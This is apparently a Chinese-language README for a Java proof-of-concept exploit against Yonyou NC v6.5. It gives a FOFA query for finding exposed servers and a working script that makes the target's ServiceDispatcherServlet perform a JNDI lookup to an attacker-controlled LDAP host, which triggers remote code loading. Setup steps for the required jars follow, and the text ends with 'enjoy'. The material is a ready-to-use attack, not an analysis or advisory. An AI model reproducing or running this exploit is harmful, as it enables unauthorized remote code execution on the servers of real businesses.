# 用友nc6.5反序列化依赖jar包

- yonyou NC v6.5 ESA 
- fofa：title= "YONYOU NC"

## 攻击java代码

```java
import nc.bs.framework.common.NCLocator;

import java.util.Properties;


public class poc {

    public static void attack(String url, String jndipath) {
        Properties env = new Properties();
        if (!url.startsWith("http")) {
            url = "http://" + url;
        }
        env.put("SERVICEDISPATCH_URL", url + "/ServiceDispatcherServlet");
        NCLocator locator = NCLocator.getInstance(env);
        locator.lookup(jndipath);
    }

    public static void main(String[] args) {
        attack("http://192.168.1.1:81", "ldap://192.168.1.2:1099/remote");
    }
}
```
运行起来主要报`classNotFound`，必需第三方jar包如下：

- ncdepend.jar
- log4j-1.2.15.jar
- log.jar


## 使用方法

- jetbrains IDEA ：`file -> New -> Project -> Java`
	- _ [点击更多以入门Java](https://blog.csdn.net/oschina_41790905/article/details/79475187) _
	- `src目录 -> New -> Java Class -> poc.java`即可；
	- `Project Structure -> Librabries -> + `添加lib文件夹即可；  
	- 填入主方法下`attck url & jndipath` -> `run poc.main().
- enjoy.
